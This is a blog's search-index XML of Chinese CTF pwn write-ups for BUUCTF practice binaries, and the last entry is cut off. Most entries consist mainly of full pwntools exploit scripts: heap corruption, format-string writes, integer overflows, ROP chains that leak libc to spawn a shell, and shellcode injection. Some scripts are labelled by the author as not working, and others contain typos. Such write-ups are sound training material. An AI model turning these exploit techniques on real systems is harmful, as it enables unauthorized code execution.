<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2022/01/23/babayheap/"/>
      <url>/2022/01/23/babayheap/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/babayheap/checksec.png" alt="image-20220123155106885" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/23/babayheap/run.png" alt="image-20220123155242621" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/babayheap/main.png" alt="image-20220123155433486" style="zoom:80%;"><ol><li><p>allocate函数,根据用户输入size根据大小进行内存分配,本程序调用了calloc函数,与malloc不同的是分配内存后会把数据区域全部置0</p></li><li><p>fill,用户提供需要修改堆块的index和要修改的size,然后根据size读取用户输入,问题就出现在size可以由用户输入,我们可以任意构造size,实现伪造堆块的效果</p></li><li><img src="/2022/01/23/babayheap/fill.png" alt="image-20220123160726616" style="zoom: 50%;"></li><li><p>free 将堆块free</p></li><li><p>dump,根据堆块大小显示出堆块中的内容</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64', log_level = 'debug')elf = ELF("./babyheap")local = 0if local:    r = process("./babyheap") else:    r = remote("node4.buuoj.cn",26810)    def allocate(size):    r.recvuntil("Command: ")    r.sendline("1")    r.recvuntil("Size: ")    r.sendline(str(size))    def fill(index,content):    r.recvuntil("Command: ")    r.sendine("2")    r.recvuntil("Index: ")    r.sendline(str(index))    r.recvuntil("Size: ")    r.sendline(str(len(content)))    r.recvuntil("Content: ")    r.sendline(content)    def free(index):    r.recvuntil("Command: ")    r.sendline("3")    r.recvuntil("Index: ")    r.sendline(str(index))    def dump(index):    r.recvuntil("Command: ")    r.sendline("4")    r.recvuntil("Index: ")    r.sendline(str(index))    r.recvline()    return r.recvline()allocate(0x10) # 0allocate(0x10) # 1allocate(0x10) # 2allocate(0x10) # 3allocate(0x10) # 4free(1)free(2)payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p64(0x80)fill(0,payload)payload = p64(0)*3payload += p64(0x21)fill(3,payload) # 为了后面malloc做准备,绕过检查allocate(0x10)allocate(0x10)fill(1,'aaaabbbb')fill(2,'bbbbcccc')payload = p64(0)*3payload += p64(0x91)fill(3,payload)allocate(0x80)free(4)libc_base = u64(dump(2)[:8].strip().ljust(8,'\x00')) -0x3c4b78log.info("libc_base: "+ hex(libc_base))allocate(0x60)free(4)payload = p64(libc_base + 0x3c4aed)fill(2,payload)allocate(0x60)allocate(0x60)payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a)fill(6,payload)allocate(255)r.interactive()# this exp is failed,next one                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn2_sctf_2016</title>
      <link href="/2022/01/23/pwn2/"/>
      <url>/2022/01/23/pwn2/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/pwn2/checksec.png" alt="image-20220123143008389" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/23/pwn2/run.png" alt="image-20220123143215385" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/pwn2/main.png" alt="image-20220123143341071" style="zoom:80%;"><img src="/2022/01/23/pwn2/vuln.png" alt="image-20220123143513120" style="zoom:80%;"><p>在程序中搜索既没有system又没有bin/sh,所以明显的rop</p><p>nptr处可以使用整数溢出构造rop</p><p>然后可以利用printf函数来泄露程序的libc版本</p><p>覆盖返回地址执行system来getshell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from LibcSearcher import *context(os = 'linux', arch = 'i386', log_level = 'debug')elf = ELF("./pwn2")local = 0if local:    r = process("./pwn2")else:    r = remote("node4.buuoj.cn",25331)printf_plt = elf.plt['printf']printf_got = elf.got['printf']main_addr = elf.symbols['main']r.recvuntil("How many bytes do you want me to read?")r.sendline("-1")leak_payload = b'a'*(0x2C+0x4)+p32(printf_plt)+p32(main_addr)+p32(printf_got)r.recvuntil("data!\n")r.sendline(leak_payload)r.recvuntil("\n")printf_addr = u32(r.recv(4))log.success("the printf_addr is " + hex(printf_addr))libc = LibcSearcher('printf',printf_addr)libc_base = printf_addr - libc.dump('printf')system_addr = libc_base + libc.dump('system')str_bin_sh_addr= libc_base + libc.dump('str_bin_sh')r.recvuntil("How many bytes do you want me to read?")r.sendline("-1")r.recvuntil("data!\n")payload = b'a'*(0x2C+0x4)+p32(system_addr)+p32(main_addr)+p32(str_bin_sh_addr)r.sendline(payload)r.interactive()    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 整数溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fm</title>
      <link href="/2022/01/23/fm/"/>
      <url>/2022/01/23/fm/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/fm/checksec.png" alt="image-20220123103302076" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/23/fm/run.png" alt="image-20220123103550362" style="zoom:80%;"><p>可以看到参数在栈上的位置为11</p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/fm/main.png" alt="image-20220123103953760" style="zoom:80%;"><p>很明显,如果我们需要使x的值为4,则需要来利用格式化字符串漏洞实现任意地址读写.</p><p>x的地址</p><img src="/2022/01/23/fm/x.png" alt="image-20220123141606735" style="zoom:80%;"><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./fm")local = 0if local:    r = process("./fm")else:    r = remote("node4.buuoj.cn",25572)x_addr = 0x0804A02Cpayload = p32(x_addr) + b"%11$n"r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bjdctf_2020_babystack2</title>
      <link href="/2022/01/23/babystack2/"/>
      <url>/2022/01/23/babystack2/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/babystack2/checksec.png" alt="image-20220123100651893" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/babystack2/main.png" alt="image-20220123100733616" style="zoom:80%;"><p>想要让read函数溢出,起码要让read的nbytes大于0x10,但是if 条件中若nbtytes大于0x10则会退出,所以这里存在一个整数溢出,如果我们输入-1,则会变成无符号数的最大值,这样就可以溢出.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./babystack2")local = 0if local:    r = process("./babystack2")else:    r = remote("node4.buuoj.cn",27245)backdoor = 0x0000000000400726r.recvuntil("[+]Please input the length of your name:")r.sendline("-1")r.recvuntil("[+]What's u name?")payload = b'a'*(0x10+0x8) + p64(backdoor)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bjdctf_2020_babyrop</title>
      <link href="/2022/01/22/2020-babyrop/"/>
      <url>/2022/01/22/2020-babyrop/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/22/2020-babyrop/checksec.png" alt="image-20220122140903977" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/22/2020-babyrop/run.png" alt="image-20220122141326579" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>发现溢出点</p><img src="/2022/01/22/2020-babyrop/vuln.png" alt="image-20220122141525939" style="zoom:80%;"><p>经过搜索,既没有system函数,也没有bin/sh字符串,所以可以使用rop,使用pwntools自带的dynELF</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>使用puts函数泄露地址,因为是64位程序,所以需要找到一个pop rdi</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary 2020_babyrop --only "pop|ret"|grep "rdi"0x0000000000400733 : pop rdi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 首先写一个leak函数,泄露函数地址def leak(addr):    count = 0    up = ''    content = ''    payload += b'A'*(0x20+0x8) # padding    payload += p64(pop_rdi)    payload += p64(addr)    payload += p64(puts_addr) #调用puts    payload += p64(main_addr) #返回main函数,刷新环境    r.send(payload)    r.recv()    while True:        #无限循环读取,防止recv()读取不全        c = r.recv(numb=1,timeout=0.1)#没读取一个字节,设置超时时间确保没有遗漏        count += 1        if up == '\n'and c == "":   #上一个字符是回车且读不到其他字符,说明读完了            content = content[:-1]+'\x00' #最后一个字符置为\x00            break        else:            content += c #拼接输出            up = c    content = content[:4]#截取最后一段作为返回值,提供给DynELF处理    log.info("%#x =&gt; %s" % (addr,(content or '').encode('hex')))    return content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./2020_babyrop")local = 0if local:    r = process("./2020_babyrop")else:    r = remote("node4.buuoj.cn",28690)pop_rdi = 0x0400733puts_addr = elf.symbols['puts']main_addr = 0x04006CBdef leak(addr):    count = 0    up = ''    content = ''    payload += b'A'*(0x20+0x8) # padding    payload += p64(pop_rdi)    payload += p64(addr)    payload += p64(puts_addr) #调用puts    payload += p64(main_addr) #返回main函数,刷新环境    r.send(payload)    r.recv()    while True:        #无限循环读取,防止recv()读取不全        c = r.recv(numb=1,timeout=0.1)#没读取一个字节,设置超时时间确保没有遗漏        count += 1        if up == '\n'and c == "":   #上一个字符是回车且读不到其他字符,说明读完了            content = content[:-1]+'\x00' #最后一个字符置为\x00            break        else:            content += c #拼接输出            up = c    content = content[:4]#截取最后一段作为返回值,提供给DynELF处理    log.info("%#x =&gt; %s" % (addr,(content or '').encode('hex')))    return contentd = DynELF(leak,elf = elf)system_addr = d.lookup('system',libc)log.success("system_addr="+hex(system_addr))r.interactive()# 使用dynELF好像不太行,换种方法吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">#这次直接泄露地址,然后使用在线工具查询from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./2020_babyrop")local = 0if local:    r = process("./2020_babyrop")else:    r = remote("node4.buuoj.cn",28690)pop_rdi = 0x0400733puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = 0x04006CB#这次利用puts_plt和puts_got泄露puts函数的地址payload1 = b'A'*(0x20+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)r.sendline(payload1)r.recv()puts_addr = u64(r.recv(6).ljust(8,'\x00'))#u64()函数的参数必须要8字节的字符串,这里puts_addr地址只有6字节,所以需要ljust方法补齐8字节才能被u64()函数执行log.success("puts_addr="+hex(puts_addr))r.interactive()#这个exp也不太行,再换个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">#这次使用LibcSearcherfrom pwn import *from LibcSearcher import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./2020_babyrop")local = 0if local:    r = process("./2020_babyrop")else:    r = remote("node4.buuoj.cn",28690)pop_rdi = 0x0000000000400733puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = elf.symbols['main']payload = 'a'*(0x20+0x8)payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)r.recvuntil("Pull up your sword and tell me u story!")r.sendline(payload)r.recv()puts_addr = u64(r.recv(6).ljust(8,'\x00'))libc = LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')system_addr = libc_base+libc.dump('system')bin_addr = libc_base+libc.dump('str_bin_sh')payload1 = 'a'*(0x20+0x8)+p64(pop_rdi)+p64(bin_addr)+p64(system_addr)r.recvuntil("story!\n")r.sendline(payload1)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018_rop</title>
      <link href="/2022/01/22/2018-rop/"/>
      <url>/2022/01/22/2018-rop/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/22/2018-rop/checksec.png" alt="image-20220122120000677" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/22/2018-rop/main.png" alt="image-20220122120046570" style="zoom:80%;"><p>发现main函数中调用了两个函数</p><img src="/2022/01/22/2018-rop/be.png" alt="image-20220122120144750" style="zoom:80%;"><img src="/2022/01/22/2018-rop/buf.png" alt="image-20220122120242644" style="zoom:80%;"><p>在第二个调用函数中发现了溢出点.</p><p>经过在ida中搜索,发现既没有system函数也没有bin/sh字符串,所以要想办法泄露出libc函数的地址来得到libc版本,找到system函数和bin/sh地址偏移.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386', log_level = 'debug')elf = ELF("./2018_rop")local = 0if local:    r = process("./2018_rop")else:    r = remote("node4.buuoj.cn",26131)read_plt = elf.plt['read']print("read_plt="+hex(read_plt))read_got = elf.got['read']print("read_got="+hex(read_got))main_addr = 0x080484C6write_plt = elf.plt['write']print("write_plt="+hex(write_plt))write_got = elf.got['write']print("write_got"+hex(write_got))payload1 = b'a'*(0x88+0x8) + p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(0x4)r.sendline(payload1)write_addr = u32(r.recv(4))#最后泄露出libc版本是libc6-i386_2.27-3ubuntu1_amd64#write_offset = 0x0e4e30#system_offset = 0x046a20#str_bin_sh_offset = 0x165ca8write_offset = 0x0e56f0system_offset = 0x03cd10str_bin_sh_offset = 0x17b8cflibc_base = write_addr - write_offsetsystem_addr = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload2 = b'a'*(0x88+0x4)+p32(system_addr)++p32(0)p32(str_bin_sh)r.sendline(payload2)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>others_shellcode</title>
      <link href="/2022/01/22/others-shellcode/"/>
      <url>/2022/01/22/others-shellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/22/others-shellcode/checksec.png" alt="image-20220122112755447" style="zoom:80%;"><p>发现开了nx和pie两种保护.</p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>运行一下发现,程序出现了命令提示符,输入linux命令还可以执行.</p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/22/others-shellcode/main.png" alt="image-20220122113313782" style="zoom:80%;"><p>main函数啥也没有,直接调用了getshell函数</p><img src="/2022/01/22/others-shellcode/getshell.png" alt="image-20220122113419292" style="zoom:80%;"><p>发现出现了系统调用.</p><p>直接nc,发现可以直接cat flag.</p><img src="/2022/01/22/others-shellcode/flag.png" alt="image-20220122113824467" style="zoom:80%;">]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_n_5</title>
      <link href="/2022/01/21/ciscn-2019-n-5/"/>
      <url>/2022/01/21/ciscn-2019-n-5/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/21/ciscn-2019-n-5/checksec.png" alt="image-20220121110154608" style="zoom:80%;"><p>啥保护都没开,而且还有RWX段</p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/21/ciscn-2019-n-5/run.png" alt="image-20220121110421109" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/21/ciscn-2019-n-5/main.png" alt="image-20220121110531596" style="zoom:80%;"><p>明显的栈溢出</p><p>因为NX保护没有开,所以我们可以使用shellcode,找一段合适的内存</p><img src="/2022/01/21/ciscn-2019-n-5/buf.png" alt="image-20220121111331331" style="zoom:80%;"><p>这一段就很合适</p><img src="/2022/01/21/ciscn-2019-n-5/name.png" alt="image-20220121113141560" style="zoom:80%;"><p>刚好第一次输入的name就位与这个段,所以我们可以在第一次输入的时候将shellcode输进去,然后在第二次输入的时候利用栈溢出再回到这里执行shellcode,从而getshell.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux', arch = 'amd64', log_level = 'debug')elf = ELF("./ciscn5")local = 0if local:    r = process("./ciscn5")else:    r = remote("node4.buuoj.cn",27656)shellcode = asm(shellcraft.sh())bss_addr = 0x0601080payload = b'a'*(0x20+0x8) + p64(bss_addr)r.sendlineafter("name\n",shellcode)r.sendlineafter("me?\n",payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_level2_x64</title>
      <link href="/2022/01/21/level2-x64/"/>
      <url>/2022/01/21/level2-x64/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>除了NX,其他啥保护都没开.</p><img src="/2022/01/21/level2-x64/checksec.png" alt="image-20220121100440210" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/21/level2-x64/run.png" alt="image-20220121100643937" style="zoom:80%;"><p>说明格式化字符串没有用</p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/21/level2-x64/main.png" alt="image-20220121100907723" style="zoom:80%;"><p>有system函数</p><img src="/2022/01/21/level2-x64/buf.png" alt="image-20220121103729091" style="zoom:80%;"><p>很容易看出这是一道简单的栈溢出的题.</p><img src="/2022/01/21/level2-x64/bin_sh.png" alt="image-20220121101002521" style="zoom:80%;"><p>有bin/sh字符串</p><p>因为是64位,所以需要使用寄存器传参,所以我们要找一个pop rdi,这里使用ROPgadget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary level2_x64 --only 'pop|ret' | grep 'rdi'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0x00000000004006b3 : pop rdi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')elf = ELF("./level2_x64")local = 0if local:    r = process("./level2_x64")else:    r = remote("node4.buuoj.cn",25582)bin_sh = 0x0600A90system_addr = 0x040063Epop_rdi = 0x04006b3payload = b'a'*(0x80+0x8) + p64(pop_rdi)+p64(bin_sh)+p64(system_addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(ps:这道题有点太简单吧,我都没啥可写了.)</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019 baby_rop</title>
      <link href="/2022/01/20/babyrop2/"/>
      <url>/2022/01/20/babyrop2/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/20/babyrop2/checksec.png" alt="image-20220120221526996" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/20/babyrop2/main.png" alt="image-20220120221608103" style="zoom:80%;"><p>明显的栈溢出,而且程序中有system函数</p><p>竟然还有/bin/sh,那这道题就简单了,直接栈溢出,劫持rip到system函数,再输入bin/sh地址</p><p><img src="/2022/01/20/babyrop2/str_bin_sh.png" alt="image-20220120221725593"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os= 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./babyrop2")local = 0if local:    r = process("./babyrop2")else:    r = remote("node4.buuoj.cn",29257)system_plt = 0x0000000000400490bin_sh = 0x0000000000601048pop_rdi = 0x0000000000400683payload = b'a'*(0x10+8) + p64(pop_rdi) +p64(bin_sh) + p64(system_plt)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后,通过find -name flag 找到flag的位置,再cat一下便可以拿到</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>not_the_same_3dctf_2016</title>
      <link href="/2022/01/20/not-the-same/"/>
      <url>/2022/01/20/not-the-same/</url>
      
        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/20/not-the-same/checksec.png" alt="image-20220120171456996" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/20/not-the-same/main.png" alt="image-20220120173314602" style="zoom:80%;"><p>可以很明显的看到栈溢出的位置</p><p>然后还有后门函数,会把flag放在bss段,本来的exp是用rop使用write函数把flag打印出来,可是打不通</p><img src="/2022/01/20/not-the-same/flag.png" alt="image-20220120173433298" style="zoom:80%;"><img src="/2022/01/20/not-the-same/fl4g.png" alt="image-20220120202044618" style="zoom:80%;"><p>但是程序中还存在mprotect函数,可以用它来修改我们内存的权限,接着写入shellcode,然后执行获取shell</p><img src="/2022/01/20/not-the-same/mprotect.png" alt="image-20220120204117505" style="zoom:67%;"><p>因为mprotext有三个参数,所以需要找到三个pop</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary not_the_same --only "pop|ret"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0x0806FCC8 : pop ebp ; pop esi ; pop edi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到一块可写的合适地址</p><img src="/2022/01/20/not-the-same/rwx.png" alt="image-20220120211929226" style="zoom:80%;"><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#这是第一版打不通的expfrom pwn import *context(os='linux',arch='i386',log_level='debug')elf = ELF("./not_the_same")local = 1if local:    r = process("./not_the_same")else:    r = remote("node4.buuoj.cn",25910)get_secret = 0x080489A0bss_addr = 0x080ECA2Dwrite_addr = 0x08050C10#从main函数的栈结构可以看出v4距离retn为0x2D,注意不要加4payload = b'a'*0x2D+ p32(get_secret)+p32(write_addr)+p32(bss)+p32(1)+p32(bss)+p32(42)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二版exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='i386',log_level='debug')elf = ELF("./not_the_same")local = 0if local:    r = process("./not_the_same")else:    r = remote("node4.buuoj.cn",27891)pop3_addr = 0x0806FCC8mprotect_addr = 0x0806ED40addr = 0x080eb000read_plt = elf.symbols['read']shellcode = asm(shellcraft.sh())payload = b'a'*0x2Dpayload += p32(mprotect_addr)+p32(pop3_addr)payload += p32(addr)+p32(0x100)+p32(0x7) #mprotect的三个参数payload += p32(read_plt) + p32(pop3_addr)payload += p32(0)+p32(addr)+p32(len(shellcode))+p32(addr) #read的三个参数r.sendline(payload)r.sendline(shellcode)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_en_3</title>
      <link href="/2022/01/20/ciscn-2019-en-2/"/>
      <url>/2022/01/20/ciscn-2019-en-2/</url>
      
